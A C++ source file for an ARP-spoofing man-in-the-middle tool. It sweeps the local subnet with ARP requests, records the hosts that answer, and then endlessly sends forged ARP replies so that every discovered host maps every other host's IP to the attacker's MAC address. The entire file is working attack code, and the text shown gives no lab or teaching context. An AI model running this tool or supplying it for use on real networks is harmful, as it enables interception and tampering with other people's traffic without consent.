#include "mitm_attack.hpp"

// #define DEBUG 1
#define INFO 1

// Function to handle receiving ARP responses
void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> &ip_mac_pairs, uint32_t gateway_ip) {
    int i;
    uint8_t buffer[IP_MAXPACKET];
    struct sockaddr saddr;
    int saddr_len = sizeof(saddr);
    // Receive ARP responses
    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    auto start_time = std::chrono::steady_clock::now();
    while (true) {
        // Check if 3 seconds have passed
        auto current_time = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count() >= 3) {
            break;
        }

        // Receive packet
        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
        if (bytes < 0) {
            perror("recvfrom() failed");
            exit(EXIT_FAILURE);
        }

        // Check if packet is an ARP packet
        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
            arp_hdr *arphdr = (arp_hdr *)(buffer + ETH_HDRLEN);

            // Check if ARP packet is a response
            if (ntohs(arphdr->opcode) == ARPOP_REPLY) {
                // Save IP-MAC pair
                ip_mac_pairs.push_back({arphdr->sender_ip, arphdr->sender_mac});

                // If the IP address is the gateway IP, continue
                if (arphdr->sender_ip[0] == (gateway_ip & 0xff) && arphdr->sender_ip[1] == ((gateway_ip >> 8) & 0xff) && arphdr->sender_ip[2] == ((gateway_ip >> 16) & 0xff) && arphdr->sender_ip[3] == ((gateway_ip >> 24) & 0xff)) {
                    continue;
                }

                // Print source IP address
                printf("%d.%d.%d.%d\t\t", arphdr->sender_ip[0], arphdr->sender_ip[1], arphdr->sender_ip[2], arphdr->sender_ip[3]);
                // Print source MAC address
                for (i = 0; i < 5; i++) {
                    printf("%02x:", arphdr->sender_mac[i]);
                }
                printf("%02x\n", arphdr->sender_mac[5]);
            }
        }
    }
    printf("-----------------------------------------\n");
}

// Function to send fake ARP replies
void send_fake_arp_replies(int sd, std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, struct sockaddr_ll &device) {
    arp_hdr arphdr;
    arphdr.htype = htons(1);             // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);      // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                     // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                     // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REPLY);  // OpCode: 2 for ARP reply
    std::array<uint8_t, IP_MAXPACKET> ether_frame;

    while (true) {
        for (size_t i = 0; i < ip_mac_pairs.size(); ++i) {
            for (size_t j = 0; j < ip_mac_pairs.size(); ++j) {
                if (i == j) continue;  // Skip sending to self

                // Construct and send fake ARP reply
                std::copy(my_mac.begin(), my_mac.end(), arphdr.sender_mac.begin());                                  // Sender hardware address (48 bits): MAC address
                std::copy(ip_mac_pairs[j].first.begin(), ip_mac_pairs[j].first.end(), arphdr.sender_ip.begin());     // Sender protocol address (32 bits): IP of another pair
                std::copy(ip_mac_pairs[i].second.begin(), ip_mac_pairs[i].second.end(), arphdr.target_mac.begin());  // Target hardware address (48 bits): MAC address of current pair
                std::copy(ip_mac_pairs[i].first.begin(), ip_mac_pairs[i].first.end(), arphdr.target_ip.begin());     // Target protocol address (32 bits): IP of current pair

                // Fill out ethernet frame header.
                int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)

                // Destination and Source MAC addresses
                std::copy(ip_mac_pairs[i].second.begin(), ip_mac_pairs[i].second.end(), ether_frame.begin());
                std::copy(my_mac.begin(), my_mac.end(), ether_frame.begin() + 6);

                // Ethernet type code (ETH_P_ARP for ARP).
                // http://www.iana.org/assignments/ethernet-numbers
                ether_frame[12] = ETH_P_ARP / 256;
                ether_frame[13] = ETH_P_ARP % 256;

                // ARP header
                memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));

                // Send ethernet frame to socket.
                if (sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }

#ifdef DEBUG
                // Print fake ARP reply
                printf("Fake ARP reply sent\n");
                printf("Source IP: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
                printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
                printf("Target IP: %d.%d.%d.%d\n", arphdr.target_ip[0], arphdr.target_ip[1], arphdr.target_ip[2], arphdr.target_ip[3]);
                printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.target_mac[0], arphdr.target_mac[1], arphdr.target_mac[2], arphdr.target_mac[3], arphdr.target_mac[4], arphdr.target_mac[5]);
                printf("-----------------------------------------\n");
#endif
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));  // Sleep for a while
    }
}

int main(int argc, char **argv) {
    char *interface;
    struct ifreq ifr;
    struct sockaddr_ll device;
    int i, frame_length, sd, bytes;
    arp_hdr arphdr;
    struct sockaddr_in src_ip;
    struct sockaddr_in netmask;
    std::array<uint8_t, 6> src_mac;
    std::array<uint8_t, 6> dst_mac;
    std::array<uint8_t, IP_MAXPACKET> ether_frame;

    if (argc != 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Interface to send packet through.
    interface = argv[1];

    // Copy source IP address.
    get_src_IP(interface, src_ip);

    // Copy source MAC address.
    get_mac_address(interface, src_mac);

    // Copy netmask.
    get_netmask(interface, netmask);

    // Find interface index from interface name and store index in
    // struct sockaddr_ll device, which will be used as an argument of sendto().
    if ((device.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index");
        exit(EXIT_FAILURE);
    }
#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(netmask.sin_addr));
    printf("Index for interface %s is %i\n", interface, device.sll_ifindex);
#endif

    // Set destination MAC address: broadcast address
    std::fill(dst_mac.begin(), dst_mac.end(), 0xff);

    // Copy IP address from sockaddr_in to sender_ip
    std::copy_n(reinterpret_cast<uint8_t *>(&src_ip.sin_addr.s_addr), 4, arphdr.sender_ip.begin());

    // Fill out sockaddr_ll.
    device.sll_family = AF_PACKET;
    std::copy(src_mac.begin(), src_mac.end(), device.sll_addr);
    device.sll_halen = htons(6);

    // ARP header
    arphdr.htype = htons(1);                                               // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);                                        // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                                                       // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                                                       // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REQUEST);                                  // OpCode: 1 for ARP request
    std::copy(src_mac.begin(), src_mac.end(), arphdr.sender_mac.begin());  // Sender hardware address (48 bits): MAC address
    arphdr.target_mac.fill(0);                                             // Target hardware address (48 bits): zero

    // Fill out ethernet frame header.
    frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)

    // Destination and Source MAC addresses
    std::copy(dst_mac.begin(), dst_mac.end(), ether_frame.begin());
    std::copy(src_mac.begin(), src_mac.end(), ether_frame.begin() + 6);

    // Ethernet type code (ETH_P_ARP for ARP).
    // http://www.iana.org/assignments/ethernet-numbers
    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;

    // Submit request for a raw socket descriptor.
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    uint32_t gateway_ip;
    get_default_gateway(gateway_ip);

    uint32_t base_ip_net = ntohl(src_ip.sin_addr.s_addr) & ntohl(netmask.sin_addr.s_addr);
    uint32_t mask_net = ntohl(~netmask.sin_addr.s_addr);

    for (uint32_t i = 1; i < mask_net; i++) {
        uint32_t dest_ip = htonl(base_ip_net | i);

        std::copy_n(reinterpret_cast<uint8_t *>(&dest_ip), 4, arphdr.target_ip.begin());
        // ARP header
        memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));
        // Send ethernet frame to socket.
        if ((bytes = sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&device, sizeof(device))) <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
    }

    // Use a table to save IP-MAC pairs
    std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> ip_mac_pairs;

    // Start the threads
    std::thread receive_thread(receive_arp_responses, sd, std::ref(ip_mac_pairs), gateway_ip);
    std::thread send_thread(send_fake_arp_replies, sd, std::ref(ip_mac_pairs), src_mac, std::ref(device));

    // Wait for the threads to finish
    receive_thread.join();
    send_thread.join();

    // Close socket descriptor.
    close(sd);

    return (EXIT_SUCCESS);
}